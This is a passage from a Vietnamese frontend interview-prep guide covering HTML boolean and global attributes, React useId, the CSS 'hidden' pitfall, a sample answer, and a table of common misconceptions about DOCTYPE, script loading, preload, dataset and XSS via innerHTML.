console.log(window.config); // HTMLDivElement — có thể đè biến global!
```

```jsx
// React: truyền boolean, React tự thêm/bỏ attribute
<button disabled={isLoading}>Lưu</button>

// useId cho id duy nhất trong component tái sử dụng
function Field({ label }) {
  const id = useId();
  return (
    <>
      <label htmlFor={id}>{label}</label>
      <input id={id} />
    </>
  );
}
```

```css
/* Bẫy hidden: CSS tác giả thắng UA style */
.toolbar { display: flex; } /* .toolbar[hidden] vẫn hiện! */

/* Fix phổ biến */
[hidden] { display: none !important; }
```

### Đáp án mẫu

> "`disabled` là **boolean attribute**: chỉ cần có mặt là true, giá trị gì cũng vậy, nên `disabled="false"` vẫn disable. Muốn bật lại phải gỡ attribute — `removeAttribute`, `toggleAttribute`, hoặc gán property `el.disabled = false`. Cần phân biệt với enumerated attribute như `contenteditable`, `draggable`, `aria-*` — ở đó `"false"` là false thật. Về `id` với `class`: `id` phải duy nhất, specificity cao nên em tránh dùng để style; em dùng `id` cho liên kết ngữ nghĩa — `label for`, `aria-labelledby`, anchor link — và trong React dùng `useId` để không trùng. Một bẫy ít người biết là `id` tạo biến global trên `window`, có thể gây DOM clobbering. Global attribute em dùng nhiều: `hidden`, `inert`, `lang`, `translate="no"`, `inputmode`, `data-*`."

---

## Bẫy thường gặp khi trả lời

| Sai lầm | Đúng là |
| ------- | ------- |
| "DOCTYPE khai báo phiên bản HTML / DTD" | Trong HTML5, DOCTYPE chỉ dùng để bật standards mode |
| "`meta charset` để đâu trong `head` cũng được" | Phải nằm trong 1024 byte đầu; HTTP header ưu tiên hơn |
| "`<div>` trong `<p>` chỉ là warning, DOM vẫn đúng" | Parser tự đóng `<p>`, DOM khác markup → hydration mismatch |
| "Đổi `span` sang `display: block` là được chứa `div`" | Content model là quy tắc HTML, CSS không thay đổi được |
| "`async` và `defer` giống nhau, chỉ là không chặn" | `defer` giữ thứ tự và chạy trước `DOMContentLoaded`; `async` thì không |
| "Thêm `defer` vào inline script" | `defer` chỉ có tác dụng với script có `src` |
| "Preload càng nhiều càng nhanh" | Preload tranh băng thông; preload font thiếu `crossorigin` tải hai lần |
| "`dataset.inStock` là boolean" | Mọi giá trị trong `dataset` đều là string |
| "Chặn thẻ `script` là chống được XSS qua `innerHTML`" | Event handler (`onerror`), `javascript:` URL vẫn chạy; dùng `textContent` hoặc sanitize |
| "`disabled="false"` sẽ bật lại button" | Boolean attribute: có mặt là true; phải gỡ attribute |
| "`title` đủ làm nhãn accessible" | Không hiện trên touch, screen reader đọc không ổn định; dùng `label` hoặc `aria-label` |
